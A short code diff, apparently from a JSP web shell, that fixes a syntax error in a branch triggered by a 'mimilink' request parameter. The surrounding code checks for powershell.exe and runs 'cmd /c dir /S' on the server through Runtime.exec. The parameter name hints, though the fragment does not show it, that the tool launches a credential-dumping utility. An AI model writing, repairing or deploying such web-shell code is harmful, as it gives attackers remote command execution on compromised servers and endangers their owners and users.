@@ -112,7 +112,7 @@ if (request.getParameter("mimilink") != null) {
 		InputStream f32in = f32.getInputStream();
 		DataInputStream f32dis = new DataInputStream(f32in);
 		String f32disr = f32dis.readLine();
-		if (f32disr == null)){
+		if (f32disr == null){
 			out.println("The executable %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe was either not found<BR>");
 			out.println("Searching for other powershell locations, this may take some time.<BR>");			
 			Process s32 = Runtime.getRuntime().exec("cmd /c dir /S %windir%\\powershell.exe");
